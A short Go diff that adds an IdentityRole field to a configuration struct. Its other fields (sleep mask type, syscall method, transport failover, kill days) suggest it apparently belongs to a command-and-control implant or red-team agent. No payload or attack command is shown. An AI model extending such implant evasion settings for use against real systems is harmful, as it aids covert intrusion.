@@ -66,6 +66,7 @@ func main() {
 		TLSProfile:          TLSProfile,
 		SleepMaskType:    SleepMaskType,
 		SyscallMethod:    SyscallMethod,
+		IdentityRole:     IdentityRole,
 
 		TransportFailoverAfter: atoi(TransportFailoverAfterRaw, 3),
 		KillDays:               atoi(KillDaysRaw, 30),
